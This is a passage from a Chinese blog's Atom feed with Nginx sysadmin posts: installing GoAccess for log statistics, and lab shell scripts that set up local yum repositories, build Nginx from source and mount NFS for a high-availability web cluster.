&#x6D4F;&#x89C8;&#x5668;&#x6216;&#x8005; *nix &#x7CFB;&#x7EDF;&#x4E0B;&#x7684;&#x7EC8;&#x7AEF;&#x7A0B;&#x5E8F;(terminal)&#x5373;&#x53EF;&#x8BBF;&#x95EE;&#x3002;</p><p>&#x80FD;&#x4E3A;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x63D0;&#x4F9B;&#x5FEB;&#x901F;&#x4E14;&#x6709;&#x4EF7;&#x503C;&#x7684; HTTP &#x7EDF;&#x8BA1;&#xFF0C;&#x5E76;&#x4EE5;&#x5728;&#x7EBF;&#x53EF;&#x89C6;&#x5316;&#x670D;&#x52A1;&#x5668;&#x7684;&#x65B9;&#x5F0F;&#x5448;&#x73B0;&#x3002;  </p><p><strong>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;</strong><br>&#x5B98;&#x7F51;&#xFF1A;<a href="https://goaccess.io/" target="_blank" rel="noopener">https://goaccess.io/</a><br>&#x4E2D;&#x6587;&#x7AD9;&#xFF1A;<a href="https://www.goaccess.cc/" target="_blank" rel="noopener">https://www.goaccess.cc/</a><br>&#x6700;&#x65B0;&#x7248;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href="https://goaccess.io/download" target="_blank" rel="noopener">https://goaccess.io/download</a><br>&#x5176;&#x5B83;&#x7248;&#x672C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/allinurl/goaccess/tags" target="_blank" rel="noopener">https://github.com/allinurl/goaccess/tags</a>  </p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 Packages]&amp; [root@rhel76 Packages]&amp; wget https://github.com/allinurl/goaccess/archive/refs/tags/v1.2.tar.gz</span><br><span class="line">[root@rhel76 Packages]&amp; tar -zxvf v1.2.tar.gz</span><br><span class="line">[root@rhel76 Packages]&amp; cd goaccess-1.2</span><br><span class="line">[root@rhel76 goaccess-1.2]&amp; </span><br><span class="line">[root@rhel76 goaccess-1.2]&amp; yum install -y ncurses-devel geoip-devel libmaxminddb-devel openssl-devel</span><br><span class="line">[root@rhel76 goaccess-1.2]&amp; ./configure --enable-utf8 --enable-geoip=mmdb</span><br><span class="line">[root@rhel76 goaccess-1.2]&amp; make &amp;&amp; make install</span><br><span class="line">[root@rhel76 ~]&amp; goaccess</span><br><span class="line"></span><br><span class="line">GoAccess - 1.2</span><br><span class="line"></span><br><span class="line">Usage: goaccess [filename] [ options ... ] [-c][-M][-H][-q][-d][...]</span><br><span class="line">The following options can also be supplied to the command:</span><br><span class="line"></span><br><span class="line">Log &amp; Date Format Options</span><br><span class="line"></span><br><span class="line">  --date-format=&lt;dateformat&gt;      - Specify log date format. e.g., %d/%b/%Y</span><br><span class="line">  --log-format=&lt;logformat&gt;        - Specify log format. Inner quotes need to be</span><br><span class="line">                                    escaped, or use single quotes.</span><br><span class="line">  --time-format=&lt;timeformat&gt;      - Specify log time format. e.g., %H:%M:%S</span><br><span class="line"></span><br><span class="line">User Interface Options</span><br><span class="line">---------------------------------&#x7701;&#x7565;----------------------------------------------------</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x57FA;&#x672C;&#x4F7F;&#x7528;</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; goaccess -f /usr/local/nginx/logs/access.log --log-format=&quot;%h %^[%d:%t %^] \&quot;%r\&quot; %s %b \&quot;%R\&quot; \&quot;%u\&quot;&quot; --date-format=&quot;%d/%b/%Y&quot; --time-format=%H:%M:%S</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s1.ax1x.com/2022/06/03/XUSh7t.png" alt="XUSh7t.png" title="">                </div>                <div class="image-caption">XUSh7t.png</div>            </figure><p>&#x751F;&#x6210;HTML&#x7EDF;&#x8BA1;&#x8868;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 nginx]$ goaccess -f /usr/local/nginx/logs/access.log --log-format=&quot;%h %^[%d:%t %^] \&quot;%r\&quot; %s %b \&quot;%R\&quot; \&quot;%u\&quot;&quot; --date-format=&quot;%d/%b/%Y&quot; --time-format=%H:%M:%S --hour-spec=min -o  /usr/local/nginx/html/nginx-log.html</span><br><span class="line">[root@rhel76 nginx]$</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s1.ax1x.com/2022/06/03/XUG0tP.png" alt="XUG0tP.png" title="">                </div>                <div class="image-caption">XUG0tP.png</div>            </figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Nginx&amp;#x65E5;&amp;#x5FD7;&amp;#x7BA1;&amp;#x7406;&quot;&gt;&lt;a href=&quot;#Nginx&amp;#x65E5;&amp;#x5FD7;&amp;#x7BA1;&amp;#x7406;&quot; class=&quot;headerlink&quot; title=&quot;Nginx&amp;#x65E5;&amp;#x5F
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx平滑升级</title>
    <link href="https://marnm.github.io//posts/1db2b3f1/"/>
    <id>https://marnm.github.io//posts/1db2b3f1/</id>
    <published>2022-06-07T04:47:23.000Z</published>
    <updated>2022-06-07T04:56:53.642Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx高可用架构配置</title>
    <link href="https://marnm.github.io//posts/d2802762/"/>
    <id>https://marnm.github.io//posts/d2802762/</id>
    <published>2022-06-07T04:47:14.000Z</published>
    <updated>2022-06-07T05:10:07.433Z</updated>
    
    <content type="html"><![CDATA[<p><strong>9&#x53F0;&#x673A;&#x5668;IP&#x5730;&#x5740;&#x5206;&#x914D;&#xFF08;&#x9759;&#x6001;&#xFF09;&#xFF1A;</strong>&#xFF1A;<br><code>192.168.110.11</code> &#x2014;-&gt; Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;<br><code>192.168.110.12</code> &#x2014;-&gt; Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;<br><code>192.168.110.13</code> &#x2014;-&gt; Nginx Server<br><code>192.168.110.14</code> &#x2014;-&gt; Nginx Server<br><code>192.168.110.15</code> &#x2014;-&gt; PHP 5.6<br><code>192.168.110.16</code> &#x2014;-&gt; PHP 5.6<br><code>192.168.110.17</code> &#x2014;-&gt; &#x5B58;&#x50A8;&#x670D;&#x52A1;<br><code>192.168.110.18</code> &#x2014;-&gt; MySQL<br><code>192.168.110.19</code> &#x2014;-&gt; NMySQL </p><h2 id="&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;"><a href="#&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;"></a>&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;</h2><p>&#x5728;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x5B8C;&#x6210;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x548C;&#x4F18;&#x5316;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> CentOS 7 Local YUM and EPEL Repository</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span> yum and epel repository</span></span><br><span class="line">function centos7(){</span><br><span class="line">mv -f /etc/yum.repos.d/*.repo /tmp/</span><br><span class="line">cat &gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF</span><br><span class="line">[local-yum]</span><br><span class="line">name=Local Base ISO Repository</span><br><span class="line">baseurl=http://192.168.110.3/iso/centos7</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">priority=1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span> epel</span></span><br><span class="line">cat &gt; /etc/yum.repos.d/epel-local.repo &lt;&lt; EOF</span><br><span class="line">[epel-local]</span><br><span class="line">name=Extra Packages for CentOS 7</span><br><span class="line">baseurl=http://192.168.110.3/epel/7/x86_64</span><br><span class="line">failovermethod=priority</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7</span><br><span class="line">EOF</span><br><span class="line">yum clean all &amp;&amp; yum makecache</span><br><span class="line">yum install -y vim wget</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Red Hat Enterprise Linux 7 Local YUM and EPEL Repository</span></span><br><span class="line">function rhel7(){</span><br><span class="line">mv -f /etc/yum.repos.d/*.repo /tmp</span><br><span class="line">cat &gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF</span><br><span class="line">[local-yum]</span><br><span class="line">name=Local Base ISO Repository</span><br><span class="line">baseurl=http://192.168.110.3/iso/rhel7</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">priority=1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span> epel</span></span><br><span class="line">cat &gt; /etc/yum.repos.d/epel-local.repo &lt;&lt; EOF</span><br><span class="line">[epel-local]</span><br><span class="line">name=Extra Packages for Enterprise Linux 7</span><br><span class="line">baseurl=http://192.168.110.3/epel/7Server/x86_64</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">EOF</span><br><span class="line">yum clean all &amp;&amp; yum makecache</span><br><span class="line">yum install -y vim wget</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Optimiz Linux</span></span><br><span class="line">sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/null</span><br><span class="line">setenforce 0</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">iptables -F</span><br><span class="line">systemctl stop NetworkManager &amp;&gt; /dev/null</span><br><span class="line">systemctl disable NetworkManager &amp;&gt; /dev/null</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change IP Address </span></span><br><span class="line">name=`ip a |  grep ens | tr -d : | awk &apos;{print $2}&apos; | head -1`</span><br><span class="line">ip=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`</span><br><span class="line"></span><br><span class="line">cat &gt; /etc/sysconfig/network-scripts/ifcfg-$name &lt;&lt; EOF</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">PEERDNS=yes</span><br><span class="line">PEERROUTES=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">NAME=$name</span><br><span class="line">DEVICE=$name</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=$ip</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.110.1</span><br><span class="line">DNS1=192.168.110.1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Manual replace ip address</span></span><br><span class="line">read -p &quot;Change New IP Address: &quot; new_ip</span><br><span class="line"></span><br><span class="line">sed -i &quot;s/$ip/$new_ip/g&quot; /etc/sysconfig/network-scripts/ifcfg-$name</span><br><span class="line"></span><br><span class="line">systemctl restart network</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change hostname</span></span><br><span class="line">host_bit=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1 | awk &apos; BEGIN{ FS=&quot;.&quot;} { print $4 }&apos;`</span><br><span class="line">hostnamectl set-hostname server$host_bit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Configuration Local Repository</span></span><br><span class="line"><span class="meta">#</span><span class="bash">OS=`cat /etc/redhat-release  | awk <span class="string">&apos;{ print $1 }&apos;</span>`</span></span><br><span class="line">if [ `cat /etc/redhat-release  | awk &apos;{ print $1 }&apos;` == &quot;CentOS&quot; ]</span><br><span class="line">    then centos7</span><br><span class="line">else</span><br><span class="line">    rhel7</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> shutdown</span></span><br><span class="line">init 0</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x914D;&#x7F6E;Nginx-Server"><a href="#&#x914D;&#x7F6E;Nginx-Server" class="headerlink" title="&#x914D;&#x7F6E;Nginx Server"></a>&#x914D;&#x7F6E;Nginx Server</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Install compiler requirment env</span></span><br><span class="line">yum install -y gcc gcc-c++ pcre pcre-devel openssl openssl-libs openssl-devel zlib zlib-devel</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">source</span> build <span class="keyword">for</span> Nginx </span></span><br><span class="line">cd /usr/local/src/</span><br><span class="line">curl -O --progress http://192.168.110.3/src/nginx-1.12.0.tar.gz</span><br><span class="line">tar -zxf nginx-1.12.0.tar.gz</span><br><span class="line">cd nginx-1.12.0/</span><br><span class="line"></span><br><span class="line">./configure --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/sbin/nginx</span><br><span class="line"></span><br><span class="line">cd /usr/local/nginx/conf/</span><br><span class="line">cp nginx.conf nginx.conf.bak</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change Nginx Config</span></span><br><span class="line">cat &gt; /usr/local/nginx/conf/nginx.conf &lt;&lt;EOF</span><br><span class="line">user nobody;</span><br><span class="line">worker_processes auto;</span><br><span class="line">worker_cpu_affinity 0001;</span><br><span class="line">worker_rlimit_nofile 50000;</span><br><span class="line"></span><br><span class="line">error_log /usr/local/nginx/logs/error.log warn;</span><br><span class="line">pid /usr/local/nginx/logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">events {</span><br><span class="line">    worker_connections 50000;</span><br><span class="line">    use epoll;</span><br><span class="line">    multi_accept on;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">http {</span><br><span class="line">    include mime.types;</span><br><span class="line">    default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">log_format  main  &apos;\$remote_addr - \$remote_user [\$time_local] &quot;\$request&quot; &apos;</span><br><span class="line">                      &apos;\$status \$body_bytes_sent &quot;\$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;\$http_user_agent&quot; &quot;\$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">    </span><br><span class="line">    access_log /usr/local/nginx/logs/access.log main;</span><br><span class="line">    sendfile on;</span><br><span class="line">    tcp_nopush on;</span><br><span class="line">    keepalive_timeout 65;</span><br><span class="line">    </span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_min_length 2K;</span><br><span class="line">    gzip_buffers 4 16k;</span><br><span class="line">    gzip_comp_level 5;</span><br><span class="line">    gzip_types text/plain application/x-javascript text/css application/xml;</span><br><span class="line">    </span><br><span class="line">    include /usr/local/nginx/conf/user/*.conf;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">nginx</span><br><span class="line"></span><br><span class="line">mkdir -p /usr/local/nginx/conf/user</span><br><span class="line">cat &gt; /usr/local/nginx/conf/user/uplooking.conf &lt;&lt;EOF</span><br><span class="line">server {</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.uplookinglinux.com;</span><br><span class="line">    </span><br><span class="line">    charset utf-8;</span><br><span class="line">    access_log /usr/local/nginx/logs/uplookinglinux.access.log main;</span><br><span class="line">    </span><br><span class="line">    location / {</span><br><span class="line">        root /var/www/web;</span><br><span class="line">        index index.html index.htm;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">    location = /50x.thml {</span><br><span class="line">        root /usr/local/nginx/html;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">nginx -s reload</span><br><span class="line"></span><br><span class="line">mkdir -p /var/www/web</span><br><span class="line">echo &quot;Welcome to Nginx&quot; &gt; /var/www/web/index.html</span><br><span class="line">chown -Rf nobody:nobody /var/www/web</span><br><span class="line"></span><br><span class="line">echo -e &quot;* soft nproc 65535\n* hard nproc 65535\n* soft nofile 65535\n* hard nofile 65535&quot; &gt;&gt; /etc/security/limits.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6D4B;&#x8BD5;Nginx</span></span><br><span class="line">CURL=&apos;/usr/bin/curl&apos;</span><br><span class="line">RVMHTTP=&quot;127.0.0.1&quot;</span><br><span class="line">CURLARGS=&quot;-s -I&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">raw=<span class="string">&quot;<span class="variable">$($CURL $CURLARGS $RVMHTTP)</span>&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> curl -s -I 127.0.0.1 &gt; /tmp/stat_code</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CURL <span class="variable">$CURLARGS</span> <span class="variable">$RVMHTTP</span> &gt; /tmp/stat_code</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x83B7;&#x53D6;http&#x72B6;&#x6001;&#x7801;</span></span><br><span class="line">http_code=`/usr/bin/sed -n &apos;1,1p&apos; /tmp/stat_code | /usr/bin/awk &apos;{ print $2 }&apos;`</span><br><span class="line"></span><br><span class="line">if [[ $http_code -ge 200 &amp;&amp; $http_code -le 299 ]]</span><br><span class="line">then</span><br><span class="line">    echo -e &quot;\e[1;32mNginx OK\e[0m&quot;</span><br><span class="line">else</span><br><span class="line">    echo -e &quot;\e[1;31mServer Error !\e[0m&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">nginx -v</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6302;&#x8F7D;NFS&#x76EE;&#x5F55;&#x5230;&#x9759;&#x6001;Nginx Server&#x4E0A;</span></span><br><span class="line">yum install -y nfs-utils &amp;&amp; mount -t nfs 192.168.110.17:/webData /var/www/web/</span><br><span class="line">echo -e &quot;192.168.110.17:/webData\t/var/www/web\tnfs\tdefaults\t0 0&quot; &gt;&gt; /etc/fstab</span><br><span class="line"></span><br><span class="line">mount -a</span><br><span class="line"></span><br><span class="line">echo &quot;&#x8BF7;&#x9000;&#x51FA;&#x5F53;&#x671F;&#x4F1A;&#x8BDD;&#x5E76;&#x91CD;&#x65B0;&#x767B;&#x5F55;&#xFF01;&quot;</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;"><a href="#&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;" class="headerlink" title="&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;"></a>&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x73AF;&#x5883;</span></span><br><span class="line">yum install -y gcc gcc-c++ pcre pcre-devel openssl openssl-libs openssl-devel zlib zlib-devel</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x83B7;&#x53D6;Nginx</span></span><br><span class="line">cd /usr/local/src/</span><br><span class="line">curl -O --progress http://192.168.110.3/src/nginx-1.12.0.tar.gz</span><br><span class="line">tar -zxf nginx-1.12.0.tar.gz</span><br><span class="line">cd nginx-1.12.0/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x7F16;&#x8BD1;Nginx</span></span><br><span class="line">./configure --with-http_v2_module 